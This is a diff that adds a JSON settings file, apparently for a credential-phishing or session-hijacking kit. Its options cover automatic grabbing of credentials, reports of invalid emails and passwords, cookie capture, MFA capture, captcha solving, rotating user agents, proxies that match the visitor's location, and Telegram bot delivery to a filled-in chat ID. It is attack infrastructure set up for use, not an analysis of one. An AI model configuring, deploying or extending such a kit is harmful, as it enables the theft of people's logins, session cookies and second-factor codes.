@@ -1,0 +1,42 @@
+   "key": "",
+   
+   "port": 80,
+   "ssl_cert": "crt.pem",
+   "ssl_key": "key.pem",
+   
+   "debugMode": true,
+   "allowedRefera": [ "No referrer"],
+
+   "sessionTimeout": 180000,
+   "headless": false,
+   "strictAutograb": false,
+   "reportInvalidPwd": true,
+   "reportInvalidEm": true,
+   "noAuth_cookie": false,
+   "blockPhone": false,
+   "rateLimit": 10,
+   "useDir": false,
+
+   "userAgents": [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.3390.107.36 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.2390.103 Safari/537.36"
+
+   ],
+
+   "captchaAPIKey": "",
+   "captchaAPIID":"2captcha",
+   "useCaptchaSolver": false,
+     
+   "telegram": false,
+   "botToken": "",
+   "chatId": "7030493392",
+
+   "useProxy": false,
+   "ProxyServa": "",
+   "ProxyUser": "",
+   "ProxyPwd": "",
+   "ProxyVisitorLocation": false,
+   "addMfa": false
+
+}
